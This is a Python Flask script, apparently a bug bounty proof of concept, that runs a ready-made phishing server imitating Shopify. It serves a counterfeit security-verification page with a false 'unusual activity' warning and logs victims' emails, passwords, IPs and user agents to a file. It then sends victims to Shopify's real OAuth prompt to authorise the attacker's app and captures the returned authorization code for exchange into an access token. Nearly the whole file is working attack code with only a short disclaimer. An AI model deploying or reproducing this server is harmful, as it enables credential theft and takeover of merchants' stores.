#!/usr/bin/env python3
"""
oauth_redirect.py - Shopify OAuth Chain POC: Credential Capture & OAuth Redirect

This Flask server acts as the attacker-controlled redirect target in the chain:

  1. Serves a fake "Shopify Security Verification" page at / that mimics
     Shopify's login page styling to collect victim credentials.

  2. After the victim submits credentials, it redirects them to the REAL
     Shopify OAuth authorization endpoint, which prompts the victim to
     authorize the attacker's OAuth application.

  3. If the victim clicks "Authorize", Shopify redirects back to /callback
     with a valid OAuth authorization code — granting the attacker access
     to the victim's store data.

USAGE:
    python3 oauth_redirect.py [--port 5000] [--attacker-ip YOUR_IP]

REQUIREMENTS:
    - Python 3.7+
    - Flask (pip install flask)

AUTHOR: xbyteid (HackerOne)
DISCLAIMER: For authorized bug bounty testing only.
"""

import os
import sys
import json
import logging
import argparse
from datetime import datetime

try:
    from flask import Flask, request, redirect, render_template_string
except ImportError:
    print("[ERROR] Flask is required. Install with: pip install flask")
    sys.exit(1)

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

# Shopify OAuth details — REPLACE WITH YOUR OWN APP CREDENTIALS
# Register your app at https://dev.shopify.com
OAUTH_CLIENT_ID = "<YOUR_CLIENT_ID>"  # <-- Replace with your app's client_id
OAUTH_CLIENT_SECRET = "<YOUR_CLIENT_SECRET>"  # <-- Replace with your app's client_secret
OAUTH_AUTHORIZE_URL = "https://accounts.shopify.com/oauth/authorize"

# Scopes must match what your app is registered with
# Default: read_products, write_products (our app's registered scopes)
OAUTH_SCOPES = "read_products,write_products"

# Log file for captured data
LOG_FILE = "/tmp/oauth_tokens.log"

# Shopify brand colors
SHOPIFY_PURPLE = "#5c6ac4"
SHOPIFY_GREEN = "#008060"

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s: %(message)s"
)
log = logging.getLogger("oauth_redirect")

# Also log to file
file_handler = logging.FileHandler(LOG_FILE)
file_handler.setFormatter(logging.Formatter("[%(asctime)s] %(message)s"))
log.addHandler(file_handler)


def log_captured(data: dict):
    """Write captured data to both console and log file."""
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        **data
    }
    log.warning("CAPTURED: %s", json.dumps(entry, indent=2))

    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")


# ---------------------------------------------------------------------------
# Flask App
# ---------------------------------------------------------------------------

app = Flask(__name__)


# HTML template for the fake Shopify security verification page
FAKE_LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopify - Verify Your Account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto,
                         Helvetica, Arial, sans-serif;
            background-color: #f4f6f8;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo h1 {
            color: #5c6ac4;
            font-size: 28px;
            font-weight: 700;
        }
        .card {
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            padding: 32px;
        }
        .alert-icon {
            text-align: center;
            margin-bottom: 16px;
        }
        .alert-icon span {
            display: inline-block;
            width: 48px;
            height: 48px;
            background: #fff3e0;
            border-radius: 50%;
            line-height: 48px;
            font-size: 24px;
        }
        h2 {
            color: #1a1a1a;
            font-size: 20px;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #637381;
            font-size: 14px;
            text-align: center;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 6px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #c9cccf;
            border-radius: 4px;
            font-size: 14px;
            color: #1a1a1a;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #5c6ac4;
            box-shadow: 0 0 0 2px rgba(92,106,196,0.2);
        }
        .btn {
            width: 100%;
            padding: 12px;
            background-color: #5c6ac4;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 8px;
        }
        .btn:hover {
            background-color: #4959bd;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #919eab;
        }
        .footer a {
            color: #5c6ac4;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>&#9672; Shopify</h1>
        </div>
        <div class="card">
            <div class="alert-icon"><span>&#9888;</span></div>
            <h2>Security Verification Required</h2>
            <p class="subtitle">
                We detected unusual activity on your account.<br>
                Please verify your identity to continue.
            </p>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <label for="email">Email Address</label>
                    <input type="email" id="email" name="email"
                           placeholder="you@example.com" required autofocus>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password"
                           placeholder="Enter your Shopify password" required>
                </div>
                <button type="submit" class="btn">Verify My Account</button>
            </form>
        </div>
        <div class="footer">
            <p>Shopify Inc. &mdash; <a href="https://www.shopify.com">shopify.com</a></p>
        </div>
    </div>
</body>
</html>
"""

# HTML template for the post-capture loading page (shows briefly while redirecting)
REDIRECT_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Verifying...</title>
    <meta http-equiv="refresh" content="2;url={{ oauth_url }}">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: #f4f6f8;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .msg {
            text-align: center;
            color: #637381;
            font-size: 16px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e1e3e5;
            border-top: 4px solid #5c6ac4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="msg">
        <div class="spinner"></div>
        <p>Verifying your account...</p>
        <p style="font-size:13px;color:#919eab;">Please wait while we confirm your identity.</p>
    </div>
</body>
</html>
"""


@app.route("/", methods=["GET"])
def index():
    """Serve the fake Shopify security verification page."""
    log.info("Victim accessed landing page from %s", request.remote_addr)
    return render_template_string(FAKE_LOGIN_PAGE)


@app.route("/capture", methods=["POST"])
def capture():
    """
    Capture the victim's credentials and redirect them to the REAL Shopify
    OAuth authorization endpoint. The victim sees a legitimate Shopify login
    prompt and may authorize the attacker's OAuth app.
    """
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    victim_ip = request.remote_addr

    # Log captured credentials
    log_captured({
        "event": "credentials_captured",
        "email": email,
        "password": password,
        "victim_ip": victim_ip,
        "user_agent": request.headers.get("User-Agent", "unknown")
    })

    # Build the real Shopify OAuth authorization URL
    # The victim will be prompted to authorize the attacker's app with these scopes
    oauth_url = (
        f"{OAUTH_AUTHORIZE_URL}"
        f"?client_id={OAUTH_CLIENT_ID}"
        f"&redirect_uri=https://{ATTACKER_IP}:{PORT}/callback"
        f"&response_type=code"
        f"&scope={OAUTH_SCOPES}"
    )

    log.info("Redirecting victim to Shopify OAuth: %s", oauth_url)

    return render_template_string(REDIRECT_PAGE, oauth_url=oauth_url)


@app.route("/callback", methods=["GET"])
def callback():
    """
    Handle the OAuth callback from Shopify after the victim authorizes.
    The 'code' parameter is a valid OAuth authorization code that can be
    exchanged for an access token.
    """
    code = request.args.get("code", "")
    state = request.args.get("state", "")
    error = request.args.get("error", "")
    victim_ip = request.remote_addr

    if error:
        log_captured({
            "event": "oauth_callback_error",
            "error": error,
            "state": state,
            "victim_ip": victim_ip,
            "full_query": request.query_string.decode()
        })
        return f"Authorization error: {error}. Please try again.", 400

    if code:
        log_captured({
            "event": "oauth_code_captured",
            "authorization_code": code,
            "state": state,
            "victim_ip": victim_ip,
            "full_query": request.query_string.decode(),
            "note": "Exchange this code at https://accounts.shopify.com/oauth/access_token"
        })

        return """
        <html>
        <head>
            <title>Verification Complete</title>
            <style>
                body {
                    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                    background: #f4f6f8;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    margin: 0;
                }
                .msg { text-align: center; color: #008060; font-size: 18px; }
                .check { font-size: 64px; margin-bottom: 16px; }
            </style>
        </head>
        <body>
            <div class="msg">
                <div class="check">&#10004;</div>
                <p>Verification complete. Your account is now secured.</p>
                <p style="font-size:14px;color:#637381;">You may close this page.</p>
            </div>
        </body>
        </html>
        """, 200

    return "Missing authorization code.", 400


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

ATTACKER_IP = "0.0.0.0"  # Will be set from args
PORT = 5000


def main():
    global ATTACKER_IP, PORT

    parser = argparse.ArgumentParser(
        description="Shopify OAuth Chain POC - OAuth Redirect Server",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: python3 oauth_redirect.py --attacker-ip 1.2.3.4 --port 5000"
    )
    parser.add_argument(
        "--attacker-ip",
        default="YOUR_IP",
        help="Your public-facing IP (default: YOUR_IP)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=5000,
        help="Port to listen on (default: 5000)"
    )
    args = parser.parse_args()

    ATTACKER_IP = args.attacker_ip
    PORT = args.port

    log.info("=" * 60)
    log.info("Shopify OAuth Chain POC - OAuth Redirect Server")
    log.info("=" * 60)
    log.info("Listening on port %d", PORT)
    log.info("Attacker IP: %s", ATTACKER_IP)
    log.info("Callback URL: https://%s:%d/callback", ATTACKER_IP, PORT)
    log.info("Log file: %s", LOG_FILE)
    log.info("")
    log.info("Phase 1: Victim lands on / -> sees fake login page")
    log.info("Phase 2: Victim submits credentials -> captured, redirected to Shopify OAuth")
    log.info("Phase 3: Victim authorizes -> /callback captures OAuth code")
    log.info("")

    app.run(host="0.0.0.0", port=PORT, debug=False)


if __name__ == "__main__":
    main()
